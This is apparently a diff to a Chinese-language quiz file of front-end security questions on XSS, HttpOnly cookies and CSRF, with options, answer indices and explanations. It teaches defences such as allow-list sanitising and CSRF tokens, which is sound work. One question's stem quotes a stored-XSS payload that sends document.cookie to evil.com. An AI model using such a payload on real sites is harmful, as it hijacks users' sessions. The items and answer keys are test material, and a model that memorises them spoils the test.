@@ -6,41 +6,67 @@
   "questions": [
     {
       "id": "q-ch-sec-frontend-1",
-      "stem": "Vue 项目里把用户评论用 `{{ comment }}` 插值渲染，换成 `v-html=\"comment\"` 后评论里的 `<img src=x onerror=...>` 会被执行。根本原因是？",
+      "stem": "论坛评论功能把用户输入原样存库，并在帖子页渲染。攻击者发了一条含 `<img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">` 的评论，之后所有浏览帖子的用户会话被批量劫持。这是哪种 XSS？为什么它最危险？",
       "options": [
-        "Vue 的插值功能有 bug",
-        "v-html 把字符串当 HTML 渲染，数据与代码的边界被打破；默认插值会自动转义所以永远安全",
-        "onerror 事件太特殊，任何写法都拦不住",
-        "浏览器版本问题"
+        "反射型：恶意参数藏在 URL 里，所以传播最广",
+        "DOM 型：纯前端事故，后端无法防护",
+        "存储型：恶意数据持久化在库里，每个浏览者都被动中招，不需要诱导任何人点击链接",
+        "Self-XSS：只影响攻击者自己，算不上事故"
       ],
-      "answer": 1,
-      "explanation": "XSS 的本质是「数据混成了代码」。框架默认插值自动转义（安全），v-html/innerHTML 是显式把不可信数据当 HTML 执行的后门。要渲染富文本必须先过 DOMPurify 这类白名单过滤。",
+      "answer": 2,
+      "explanation": "数据「存库后回显」是存储型 XSS 的标志：一次投毒、全网中招。反射型必须诱导点击，DOM 型是前端 JS 自己塞数据，都不具备「持久化 + 全体被动受害者」的特征。",
       "lessonId": "l-sec-xss"
     },
     {
       "id": "q-ch-sec-frontend-2",
-      "stem": "为什么防御 XSS 不推荐「自己写正则过滤 <script>」，而推荐白名单过滤（如 DOMPurify）？",
+      "stem": "评论功能要支持加粗与链接（富文本），直接 v-html 渲染用户输入会中 XSS。最合适的修复方案是？",
       "options": [
-        "正则写起来太麻烦",
-        "黑名单拦不住变体：<img onerror>、大小写、编码绕过都能绕过正则；白名单「只允许什么」在结构上更可靠",
-        "正则性能太差",
-        "白名单是浏览器内置的"
+        "先用 DOMPurify 白名单过滤，只保留允许的标签与属性，再渲染",
+        "用正则删除所有 <script> 标签后再 v-html 渲染",
+        "把评论里的引号全部删掉",
+        "要求用户关闭浏览器的 JavaScript"
       ],
-      "answer": 1,
-      "explanation": "攻击者的绕过手段无穷（属性事件、编码变体、嵌套标签），黑名单永远是打地鼠。白名单把问题反过来：默认全部禁止，只放行明确允许的标签和属性。",
+      "answer": 0,
+      "explanation": "富文本需求必须放行 HTML，唯一可靠的做法是白名单过滤（默认全禁、显式放行）。正则黑名单拦不住 img onerror 等变体，删引号与禁 JS 都误伤正常功能。",
       "lessonId": "l-sec-xss"
     },
     {
       "id": "q-ch-sec-frontend-3",
-      "stem": "CSRF 攻击里，evil.com 伪造表单向 bank.com 发 POST，为什么请求会带着用户的登录 Cookie？",
+      "stem": "站点某页面仍存在注入点，但登录 Cookie 已设置 HttpOnly。攻击者的注入脚本会怎样？",
       "options": [
-        "evil.com 用 JS 读取了 bank.com 的 Cookie",
-        "浏览器对发往 bank.com 的请求自动附带该站的 Cookie，不管请求由谁发起——攻击者全程不需要知道凭证内容",
-        "用户误点了同意授权",
-        "bank.com 的 Cookie 设置了 domain=evil.com"
+        "完全失效，什么也做不了",
+        "可以读到 HttpOnly Cookie，只是读取变慢",
+        "无法执行任何 JS，因为 HttpOnly 会拦截脚本执行",
+        "仍能执行 JS（改页面内容、代发请求），但 document.cookie 读不到登录 Cookie，偷不走凭证"
+      ],
+      "answer": 3,
+      "explanation": "HttpOnly 只封「JS 读 Cookie」这一条路，不阻止脚本执行——页面仍可被滥用，但账号不会被接管。这正是「降低爆炸半径」的纵深防御，而不是根治注入。",
+      "lessonId": "l-sec-xss"
+    },
+    {
+      "id": "q-ch-sec-frontend-4",
+      "stem": "evil.com 伪造表单向 bank.com 发起转账 POST 并成功。CSRF 成立的必要条件组合是？",
+      "options": [
+        "evil.com 破解了 bank.com 的密码哈希",
+        "浏览器对发往 bank.com 的请求自动附带登录 Cookie + 请求参数可完全伪造 + 服务端只认 Cookie 不验证请求来源",
+        "bank.com 使用了 HTTP 明文传输",
+        "用户在 evil.com 上也登录了同一账号"
       ],
       "answer": 1,
-      "explanation": "Cookie 的自动附带机制是 CSRF 成立的必要条件：跨站伪造的请求同样会被浏览器带上目标站点的凭证。SameSite=Lax/Strict 正是掐断这个机制——跨站请求不带 Cookie。",
+      "explanation": "三个必要条件缺一不可：自动带 Cookie 是攻击的燃料，参数可伪造让请求能被构造，服务端只认牌不看人让它无法分辨真伪。攻击者全程不需要知道凭证内容——是「借」不是「偷」。",
+      "lessonId": "l-sec-csrf"
+    },
+    {
+      "id": "q-ch-sec-frontend-5",
+      "stem": "CSRF Token 为什么能让 evil.com 的伪造表单必然失败？",
+      "options": [
+        "Token 加密了表单数据，evil.com 解不开",
+        "浏览器会强制拒绝一切来自跨站的 POST 请求",
+        "Token 嵌在本站页面里，同源策略保证 evil.com 读不到它；盲发的伪造请求没有有效票据，校验直接 403",
+        "Token 能自动检测请求是否来自用户的真实点击"
+      ],
+      "answer": 2,
+      "explanation": "同源策略禁止跨站读取别的站点页面 DOM，evil.com 只能盲发请求——而盲发请求里没有那张嵌在页面里的票。SameSite=Lax 拦截的是「自动带 Cookie」，浏览器并不会无条件拒绝跨站 POST。",
       "lessonId": "l-sec-csrf"
     }
   ]
